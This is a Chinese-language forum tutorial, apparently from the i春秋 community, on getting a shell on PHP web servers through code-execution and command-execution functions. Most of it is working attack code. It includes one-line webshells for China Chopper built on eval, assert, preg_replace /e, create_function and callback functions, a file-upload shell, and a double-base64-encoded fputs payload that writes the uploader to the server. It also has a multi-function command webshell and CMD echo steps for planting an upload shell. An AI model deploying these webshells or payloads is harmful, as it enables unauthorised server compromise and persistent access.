i春秋作家:[大家奥斯的哦](https://bbs.ichunqiu.com/thread-41471-1-1.html?from=beef)

[原文来自：https://bbs.ichunqiu.com/thread-41471-1-1.html](https://bbs.ichunqiu.com/thread-41471-1-1.html?from=beef)

  

代码执行函数 VS 命令执行函数

  

一直想整理这两块的内容，但是一直没时间弄，直到前两天碰上一个写入了菜刀马但是死活连不上菜刀的站，顿时不知道怎么继续了，所以就趁这个机会整理了一下代码执行函数怎么getshell和命令执行函数怎么getshell的思路，各位大牛有什么想法可以一起交流一下。那么我们开始正题。

  
菜刀马的原理其实是调用了代码执行函数。而菜刀之所以能够执行系统命令和上传文件，也是调用了命令执行函数。命令马的原理是调用了命令执行函数。

  
这两种都能够getshell（以上传大马为准）因为有一些服务器做了限制，比如菜刀连不上，或者禁用了某些函数，或者利用SQL注入写文件和XML之类的漏洞，所以有时候在有了菜刀马和命令马之后要上传大马还是有一些波折的，当然能够直接上传或写入大马的除外。

  
一、首先是菜刀马：  
菜刀马的原理是调用了PHP的代码执行函数，比如以下1和2两个常见的一句话菜刀马，就是调用了eval函数、assert函数。  
  
1、eval()函数![image.png](https://image.3001.net/images/20180611/15286997243106.png!small)

![image.png](https://image.3001.net/images/20180611/15286997339835.png!small)

那么当我们上传了eval函数的菜刀马之后，在连接不上菜刀的情况下怎么上传大马呢？继续往下看

这里我是先写一个上传马，再用上传马去上传大马，有点多次一举，但是考虑到大马代码量太多，还是建议先写个上传马，以下代码只有1kb。

  

<?php

@$temp = $_FILES['upload_file']['tmp_name'];

@$file = basename($_FILES['upload_file']['name']);

if (empty ($file)){

echo "<form action = '' method = 'POST' ENCTYPE='multipart/form-data'>\n";echo
"Local file: <input type = 'file' name = 'upload_file'>\n";echo "<input type =
'submit' value = 'Upload'>\n";echo "</form>\n<pre>\n\n</pre>";}else
{if(move_uploaded_file($temp,$file)){echo "File uploaded
successfully.<p>\n";}else {echo "Unable to upload " . $file . ".<p>\n";}}?>

  

原理是利用文件操作函数如下：  

> fputs(fopen(shell.php,w),xxxx);

写入xxxx到脚本执行文件当前目录下的shell.php文件。  
由于是利用post传参，不能出现【<】【>】【+】【=】【/】等符号，所以这里我们需要把代码编码一下，将上面的上传代码进行两次base64编码（为了去除=号）。

  
☆☆☆[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[链接文字](https://bbs.ichunqiu.com/thread-41471-1-1.html?from=beef)在编码的时候空格和回车都会影响编码后的结果，因此建议大家直接复制我上面的上传马或者用下面我编码好的，或者自己去慢慢尝试直到base64编码后为一串自由数字和字母的字符串即可。  
接下来利用文件操作函数写入上传马，注意不要忘了最后的分号。

  

cmd=fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(base64_decode(UEQ5d2FIQWdEUXBBSkhSbGJYQWdQU0FrWDBaSlRFVlRXeWQxY0d4dllXUmZabWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRPdzBLUUNSbWFXeGxJRDBnWW1GelpXNWhiV1VvSkY5R1NVeEZVMXNuZFhCc2IyRmtYMlpwYkdVblhWc25ibUZ0WlNkZEtUc05DbWxtSUNobGJYQjBlU0FvSkdacGJHVXBLWHNOQ21WamFHOGdJanhtYjNKdElHRmpkR2x2YmlBOUlDY25JRzFsZEdodlpDQTlJQ2RRVDFOVUp5QkZUa05VV1ZCRlBTZHRkV3gwYVhCaGNuUXZabTl5YlMxa1lYUmhKejVjYmlJN1pXTm9ieUFpVEc5allXd2dabWxzWlRvZ1BHbHVjSFYwSUhSNWNHVWdQU0FuWm1sc1pTY2dibUZ0WlNBOUlDZDFjR3h2WVdSZlptbHNaU2MrWEc0aU8yVmphRzhnSWp4cGJuQjFkQ0IwZVhCbElEMGdKM04xWW0xcGRDY2dkbUZzZFdVZ1BTQW5WWEJzYjJGa0p6NWNiaUk3WldOb2J5QWlQQzltYjNKdFBseHVQSEJ5WlQ1Y2JseHVQQzl3Y21VK0lqdDlaV3h6WlNCN2FXWW9iVzkyWlY5MWNHeHZZV1JsWkY5bWFXeGxLQ1IwWlcxd0xDUm1hV3hsS1NsN1pXTm9ieUFpUm1sc1pTQjFjR3h2WVdSbFpDQnpkV05qWlhOelpuVnNiSGt1UEhBK1hHNGlPMzFsYkhObElIdGxZMmh2SUNKVmJtRmliR1VnZEc4Z2RYQnNiMkZrSUNJZ0xpQWtabWxzWlNBdUlDSXVQSEErWEc0aU8zMTlQejQ9)));  

  

成功得到上传马，之后就是上传我们的大马了。  

![110451d3ebj3fnfeqffs3j.png.thumb.jpg](https://bbs.ichunqiu.com/data/attachment/forum/201806/08/110451d3ebj3fnfeqffs3j.png.thumb.jpg)

2、assert()函数  

  

#assert函数是直接将传入的参数当成PHP代码直接，不需要以分号结尾，当然你加上也可以。

#命令執行：cmd=system(whoami)

#菜刀连接密码：cmd

<?php @assert($_POST['cmd'])?>

![110452wfm8ckvpjqfp4ppq.png.thumb.jpg](https://bbs.ichunqiu.com/data/attachment/forum/201806/08/110452wfm8ckvpjqfp4ppq.png.thumb.jpg)

上传大马,这一步参考eval函数。  
  
  
其他的代码执行函数还有以下几个，均给出了菜刀马和连接方式：  
  
3、preg_replace()  

  

#preg_replace('正则规则','替换字符'，'目标字符')

#执行命令和上传文件参考assert函数(不需要加分号)。

#将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。

preg_replace("/test/e",$_POST["cmd"],"jutst test");

这里可以使用chr()函数转换ASCII编码来执行代码。

> #phpinfo();  
>
> eval(chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111).chr(40).chr(41).chr(59))

  
![110711wsqefv3alls3elqz.png.thumb.jpg](https://bbs.ichunqiu.com/data/attachment/forum/201806/08/110711wsqefv3alls3elqz.png.thumb.jpg)

4、create_function()函数  

  

#创建匿名函数执行代码

#执行命令和上传文件参考eval函数(必须加分号)。

#菜刀连接密码：cmd

$func =create_function('',$_POST['cmd']);$func();

  
5、array_map()函数

  

#array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给
array_map() 函数的数组数目一致。

#命令执行http://localhost/123.php?func=system cmd=whoami

#菜刀连接http://localhost/123.php?func=assert 密码：cmd

$func=$_GET['func'];

$cmd=$_POST['cmd'];

$array[0]=$cmd;

$new_array=array_map($func,$array);

echo $new_array;

![110712ptssreqrtazaaa9r.png.thumb.jpg](https://bbs.ichunqiu.com/data/attachment/forum/201806/08/110712ptssreqrtazaaa9r.png.thumb.jpg)

6、call_user_func()函数  

  

#传入的参数作为assert函数的参数

#cmd=system(whoami)

#菜刀连接密码：cmd

call_user_func("assert",$_POST['cmd']);

  

7、call_user_func_array()函数

  

#将传入的参数作为数组的第一个值传递给assert函数

#cmd=system(whoami)

#菜刀连接密码：cmd

$cmd=$_POST['cmd'];

$array[0]=$cmd;

call_user_func_array("assert",$array);

  

  
8、array_filter()函数  

  

#用回调函数过滤数组中的元素：array_filter(数组,函数)

#命令执行func=system&cmd=whoami

#菜刀连接http://localhost/123.php?func=assert 密码cmd

$cmd=$_POST['cmd'];

$array1=array($cmd);

$func =$_GET['func'];

array_filter($array1,$func);

  

9、uasort()函数

  

#php环境>=<5.6才能用

#uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。

#命令执行：http://localhost/123.php?1=1+1&2=eval($_GET[cmd])&cmd=system(whoami);

#菜刀连接：http://localhost/123.php?1=1+1&2=eval($_POST[cmd]) 密码：cmd

usort($_GET,'asse'.'rt');

  

  
  
二、命令执行函数  
PHP执行系统命令的有几个常用的函数,如有:system函数、exec函数、popen函数,passthru,shell_exec函数他们都可以执行系统命令，下面是我整理的一个命令马，把常见的命令执行函数都做了一个梳理，如果大家还有什么新的思路或见解，可以一起交流交流。

  

<?php

$command=$_POST['cmd'];

#function exec_all($command)

#{

//system函数可执行并直接显示结果

if(function_exists('system'))

{

echo "<pre>";

system($command);

echo "</pre>";

}

//passthru函数可执行并直接显示结果

else if(function_exists('passthru'))

{

echo "<pre>";

passthru($command);

echo "</pre>";

}

//shell_exec函数可执行但需要加echo才能显示结果

else if(function_exists('shell_exec'))

{

echo "<pre>";

echo shell_exec($command);

echo "</pre>";

}

//function exec(命令，以数组形式的保存结果，命令执行的状态码)

//可执行，但需要加echo才能显示结果

else if(function_exists('exec'))

{

echo "<pre>";

exec($command,$output);

echo "</br>";

print_r($output);

echo "</pre>";

}

//popen函数：打开一个指向进程的管道，该进程由派生指定的 command 命令执行而产生。

//返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）

//此指针可以用于 fgets()，fgetss() 和 fwrite()。并且必须用 pclose() 来关闭。

//若出错，则返回 false。

else if(function_exists('popen'))

{

$handle = popen($command , "r"); // Open the command pipe for reading

if(is_resource($handle))

{

if(function_exists('fread') && function_exists('feof'))

{

echo "<pre>";

while(!feof($handle))

{

echo fread($handle, 1024);

}

echo "</pre>";

}

else if(function_exists('fgets') && function_exists('feof'))

{

echo "<pre>";

while(!feof($handle))

{

echo fgets($handle,1024);

}

echo "<pre>";

}

}

pclose($handle);

}

//proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。

else if(function_exists('proc_open'))

{

$descriptorspec = array(

1 => array("pipe", "w"), // stdout is a pipe that the child will write to

);

$handle = proc_open($command ,$descriptorspec , $pipes); // This will return
the output to an array 'pipes'

if(is_resource($handle))

{

if(function_exists('fread') && function_exists('feof'))

{

echo "<pre>";

while(!feof($pipes[1]))

{

echo fread($pipes[1], 1024);

}

echo "</pre>";

}

else if(function_exists('fgets') && function_exists('feof'))

{

echo "<pre>";

while(!feof($pipes[1]))

{

echo fgets($pipes[1],1024);

}

echo "<pre>";

}

}

#pclose($handle);

}

else

{

echo 'GG';

}

#}

  

其他函数：  
暂时就知道其他两个函数，不过也都是基于以上的函数所变化的。

  

<?php

$cmd=$_POST['cmd'];

echo "<pre>";

//可执行并直接显示结果,反引号，波浪键。

//shell_exec() 函数实际上仅是反撇号 (`) 操作符的变体

//所以如果把shell_exec()函数禁用了，反撇号 (`)也是执行不了命令的。

echo `$cmd`;

//注意，这个只显示结果的第一行，因此基本只能执行whoami

//ob_start：打开缓冲区,需要system函数开启

$a = 'system';

ob_start($a);

echo "$_POST[cmd]";

ob_end_flush();

echo "</pre>";

  

  

上面讲完命令执行命令，也都可以执行命令了，那么如何利用这些命令马来进一步上传我们的大马呢，这里就要涉及到一下CMD命令了，有兴趣的同学可以去参考链接查看《CMD命令特殊符号》的文章。

  
这里了我是用echo写文件的思路，遗忘大佬教的用msf结合命令行去下载大马我暂时还没去实践，就留着以后有时间再写了，废话不多说，开干吧！

![105805s40hw5n91zhj19hb.png.thumb.jpg](https://bbs.ichunqiu.com/data/attachment/forum/201806/08/105805s40hw5n91zhj19hb.png.thumb.jpg)

成功执行命令之后，首先利用【dir】命令得到网站路径，如果是mysql注入得到的os-shell也可用【dir d:\ /b】命令查找存放网站程序的路径。  

![105845s5182ygrspxu8gxn.png.thumb.jpg](https://bbs.ichunqiu.com/data/attachment/forum/201806/08/105845s5182ygrspxu8gxn.png.thumb.jpg)

然后用【echo】命令写入我们的上传马  

![105806poksqpfvfooovqoz.png.thumb.jpg](https://bbs.ichunqiu.com/data/attachment/forum/201806/08/105806poksqpfvfooovqoz.png.thumb.jpg)

☆☆☆这里注意【<】【>】【&】这三个字符在CMD命令行中有特殊意义，需要在前面加【^】进行转义，可以用文本的替换来实现这个功能。  

![105807y877oqzy87oq798y.png.thumb.jpg](https://bbs.ichunqiu.com/data/attachment/forum/201806/08/105807y877oqzy87oq798y.png.thumb.jpg)

写入成功之后就可以上传我们的大马啦 ^-^！然后就看大家的啦，该修复修复，想提交提交，到这里就结束啦，有什么意见欢迎一起交流交流。

  

  

参考链接：

[https://www.cnblogs.com/xiaozi/p/7834367.html](https://bbs.ichunqiu.com/thread-41471-1-1.html?from=beef)

[https://blog.csdn.net/yatere/article/details/7765270](https://bbs.ichunqiu.com/thread-41471-1-1.html?from=beef)

[http://blog.163.com/magicc_love/ ...
662201542810350983/](https://bbs.ichunqiu.com/thread-41471-1-1.html?from=beef)

  

i春秋推出优享会员制，开通会员可以免费畅享多类课程、实验、CTF赛题等付费内容，并可享有包括会员日专属福利、就业推荐等多种特权福利，更多活动详情可点击：[https://bbs.ichunqiu.com/thread-40795-1-1.html](https://bbs.ichunqiu.com/thread-40795-1-1.html?from=qd)了解哦~  

